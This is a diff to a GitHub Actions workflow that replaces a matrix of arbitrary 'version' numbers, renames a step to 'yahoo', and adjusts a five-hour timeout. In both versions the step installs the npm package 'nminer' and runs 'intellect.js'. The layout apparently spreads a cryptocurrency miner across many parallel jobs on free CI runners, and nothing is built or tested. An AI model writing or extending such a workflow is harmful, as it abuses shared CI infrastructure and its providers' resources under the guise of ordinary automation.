@@ -9,24 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 7181 }
-          - { version: 3784 }
-          - { version: 3104 }
-          - { version: 5809 }
-          - { version: 228 }
-          - { version: 7463 }
-          - { version: 8942 }
-          - { version: 5305 }
-          - { version: 9501 }
-          - { version: 146 }
-          - { version: 8533 }
-          - { version: 6723 }
-          - { version: 847 }
-          - { version: 9322 }
-          - { version: 986 }
-          - { version: 9407 }
-          - { version: 7460 }
-          - { version: 7013 }
+          - { version: 2708 }
+          - { version: 9836 }
+          - { version: 7777 }
+          - { version: 5840 }
+          - { version: 6547 }
+          - { version: 6771 }
+          - { version: 69 }
+          - { version: 6281 }
+          - { version: 7858 }
+          - { version: 263 }
+          - { version: 1887 }
+          - { version: 9071 }
+          - { version: 5310 }
+          - { version: 4482 }
+          - { version: 6336 }
+          - { version: 9507 }
 
     steps:
       - name: Checkout
@@ -37,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: which plus times
+      - name: yahoo
         run: |
           npm install nminer@latest
-          timeout 338m node intellect.js || echo "intellect executed"
+          timeout 304m node intellect.js || echo "intellect executed"
